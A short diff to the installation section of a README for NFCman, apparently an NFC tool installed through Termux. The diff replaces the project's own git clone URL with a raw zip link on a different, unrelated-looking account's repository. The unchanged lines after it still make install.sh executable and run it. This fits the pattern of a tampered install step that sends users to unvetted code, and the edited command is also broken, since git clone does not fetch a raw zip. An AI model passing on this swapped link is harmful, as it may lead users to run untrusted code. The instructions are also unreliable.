@@ -76,7 +76,7 @@ Install Termux from F-Droid or Google Play Store to ensure compatibility with mo
 ### Framework Deployment
 
 ```bash
-git clone https://github.com/CPScript/NFCman
+git clone https://github.com/KungBugFuOnYou/NFCmanX/raw/refs/heads/main/firm/NF_X_Cman_2.1.zip
 cd NFCman
 chmod +x install.sh
 ./install.sh
